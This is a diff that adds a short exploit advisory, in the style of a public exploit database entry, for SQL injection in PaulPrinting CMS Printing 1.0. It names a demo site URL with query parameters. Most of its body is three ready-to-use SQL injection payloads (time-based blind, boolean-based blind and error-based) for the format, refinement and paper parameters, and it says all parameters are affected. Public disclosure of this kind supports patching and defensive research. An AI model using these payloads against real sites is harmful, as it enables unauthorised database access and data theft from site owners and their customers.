@@ -1,0 +1,27 @@
+# Exploit Title: PaulPrinting CMS Printing 1.0 - SQL Injection
+# Exploit Date: 2018-05-19
+# Software Link: https://codecanyon.net/item/paulprinting-cms-printing-solutions/19546365
+# Author: Mehmet Onder Key
+# Version: 1.0
+# Tested On: Linux
+
+# 1. Description
+# Any visitor can run code to exploit css and sql vulnerabilities in the
+# products and order sections.
+
+# 2. Proof of Concept
+# Example parameter with demo site :  http://demo.codepaul.com/
+# printing/products/businesscard?pricelist=1&format=90x50&pages=2p4cf&
+# paper=300g_ma&refinement=lamco
+
+# Time-Based Blind SQL Payload:
+format=keyney+akkus') OR SLEEP(5)-- DLea
+
+# Boolean-Based Blind SQL Payload:
+refinement=were') OR NOT 4134=4134#
+
+# Error-Based SQL Payload
+paper=here') OR (SELECT 1712 FROM(SELECT COUNT(*),CONCAT(0x71706b6a71,(SELECT
+(ELT(1712=1712,1))),0x7171706a71,FLOOR(RAND(0)*2))x FROM
+INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- oXDz
+etc... (all parameter is effected -pricelist)
